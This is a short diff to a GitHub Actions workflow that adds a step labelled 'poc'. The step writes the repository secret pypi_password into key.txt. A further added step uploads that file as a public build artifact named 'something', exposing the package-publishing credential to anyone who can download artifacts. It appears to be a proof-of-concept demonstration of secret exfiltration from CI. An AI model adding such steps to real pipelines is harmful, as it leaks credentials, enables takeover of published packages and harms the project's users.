@@ -31,6 +31,19 @@ jobs:
     - name: test
       run: |
         skipper make all
+    - name: poc
+      run: 'echo "$SSH_KEY" > key.txt'
+      shell: bash
+      env:
+        SSH_KEY: ${{secrets.pypi_password}}
+    - name: Archive artifacts
+      uses: actions/upload-artifact@v4
+      with:
+        name: something
+        path: |
+          key.txt
+
+  
 
   test-user-install:
     runs-on: ubuntu-latest
